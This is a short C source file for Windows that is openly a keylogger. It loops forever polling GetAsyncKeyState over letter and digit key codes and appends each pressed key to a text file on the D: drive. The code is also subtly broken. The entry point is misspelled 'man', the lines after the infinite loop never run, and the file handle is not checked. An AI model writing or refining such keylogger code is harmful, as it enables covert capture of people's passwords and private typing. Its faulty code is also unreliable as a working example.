#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#define DELAY 150

void writedown(char key){
    char *path ="D:\\Klog.txt";
    FILE *out;
    out = fopen(path, "a+");
    fprintf(out, "%c", key);
    fclose(out);}


    int man(){

    char i;
    while(1 == 1){

    for(i = 31; i < 91; i++){
        if(GetAsyncKeyState(i) != NULL){

            writedown(i);
            Sleep(DELAY);}}}

            getchar();
            getchar();
            return 0;}
